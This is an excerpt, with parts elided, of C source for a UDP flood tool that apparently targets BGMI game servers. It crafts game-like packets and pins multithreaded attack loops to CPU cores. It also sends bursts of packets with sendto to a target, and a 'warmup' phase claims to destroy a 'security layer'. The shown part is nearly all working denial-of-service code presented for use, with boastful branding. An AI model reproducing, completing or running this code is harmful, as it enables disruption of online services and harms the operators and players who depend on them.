...
#define WARMUP_PACKET_SIZE 32
#define WARMUP_BURST_MULTIPLIER 3
#define WARMUP_SLEEP_DIVIDER 3
...
void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed, int is_warmup) {
    if (is_warmup && size == WARMUP_PACKET_SIZE) {
        memset(buf, 0xFF, WARMUP_PACKET_SIZE);
        buf[0] = 0x4C;
        buf[1] = 0x42;
        buf[2] = 0x52;
        buf[3] = 0xFF;
        uint32_t *seq_num = (uint32_t*)(buf + 4);
        *seq_num = 0xFFFFFFFF;
        uint32_t *timestamp = (uint32_t*)(buf + 8);
        *timestamp = 0x00000000;
        for (int i = 12; i < WARMUP_PACKET_SIZE; i++) {
            buf[i] = 0x00;
        }
        return;
    }
    ...
    if (size > PACKET_HEADER_SIZE) {
        if (size <= 40) {
            for (int i = PACKET_HEADER_SIZE; i < size; i++) {
...
void *direct_attack(void *arg) {
    ...
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0 && packets[i]) {
            create_bgmi_packet(packets[i], PACKET_SIZE, thread_idx + 1000, 0, &seed, 0);
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            ...
            create_bgmi_packet(packets[i], PACKET_SIZE, thread_idx + 1000, seq_counter, &seed, !atomic_load(&warmup_complete));
...
void *attack_thread(void *arg) {
    ...
    int core = tid % num_cores % CPU_SETSIZE;
    CPU_SET(core, &cpuset);
    ...
    char warmup_packet[WARMUP_PACKET_SIZE];
    ...
    create_bgmi_packet(packet, PACKET_SIZE, tid, 0, &seed, 0);
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (!atomic_load(&warmup_complete)) {
            ...
            create_bgmi_packet(warmup_packet, WARMUP_PACKET_SIZE, tid, seq_local, &seed, 1);
            
            for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
                int ret = sendto(s, warmup_packet, WARMUP_PACKET_SIZE, MSG_DONTWAIT,
                               (struct sockaddr *)&target_addr, sizeof(target_addr));
                if (ret == WARMUP_PACKET_SIZE) {
                    local_packets++;
                    local_bytes += WARMUP_PACKET_SIZE;
                    seq_local++;
                } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    break;
                }
            ...
            create_bgmi_packet(packet, PACKET_SIZE, tid, seq_local, &seed, 0);
...
void *warmup_controller(void *arg) {
    printf("⚡ MAX POWER Layer Break: %d seconds...\n", WARMUP_SECONDS);
    ...
    if (!atomic_load(&stop_signal)) {
        ...
        printf("✅ Security layer DESTROYED\n");
        printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    }
...
void *stats_monitor(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (atomic_load(&should_attack)) {
            ...
            while (pps > current_peak) {
                if (atomic_compare_exchange_weak(&peak_pps, &current_peak, pps)) {
                    break;
                }
            }
...
int main(int argc, char *argv[]) {
    ...
    if (pthread_create(&warmup_thread, NULL, warmup_controller, NULL) != 0) {
